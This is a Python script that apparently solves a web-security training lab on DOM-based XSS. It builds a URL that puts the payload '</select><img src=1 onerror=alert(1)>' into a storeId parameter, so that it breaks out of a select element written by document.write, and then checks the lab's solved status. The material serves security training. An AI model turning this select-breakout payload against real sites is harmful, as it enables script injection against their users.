import argparse
import requests

# DOM XSS in a document.write sink using source location.search, inside a <select>
# element. The product page's stock checker writes the storeId param inside a
# <select>/<option>. Content inside a <select> is a parsing dead zone, so an img
# won't execute until you break out with </select>. Angle brackets aren't encoded
# here, so </select><img src=1 onerror=alert(1)> does it.
#
# DOM-based: the payload executes in the browser (document.write reads location.search
# client-side), so Python can't fire the alert. The script prints the exploit URL
# and checks the lab status. (DOM Invader can also auto-generate this exploit.)

parser = argparse.ArgumentParser(description="Solve XSS lab 10 (DOM XSS, document.write in a select element)")
parser.add_argument("lab_url", help="Lab URL (https://0a...web-security-academy.net)")
parser.add_argument("--product", default="1", help="productId for the stock-checker page")
parser.add_argument("--payload", default="</select><img src=1 onerror=alert(1)>",
                    help="select-breakout payload placed in storeId")
args = parser.parse_args()

lab_url = args.lab_url.rstrip("/")

# the payload rides in storeId; document.write reads it client-side from location.search
# and writes it inside the <select>, where </select> breaks out before the img.
exploit_url = (f"{lab_url}/product?productId={args.product}"
               f"&storeId={requests.utils.quote(args.payload)}")

print("[*] This is DOM-based XSS - the payload executes in the browser, not server-side.")
print("[*] Open this URL in a browser to trigger the alert:")
print(f"    {exploit_url}")

if "is-solved" in requests.get(lab_url + "/").text:
    print("[+] Lab solved!")
else:
    print("[!] Not marked solved yet - load the exploit URL above in a browser.")
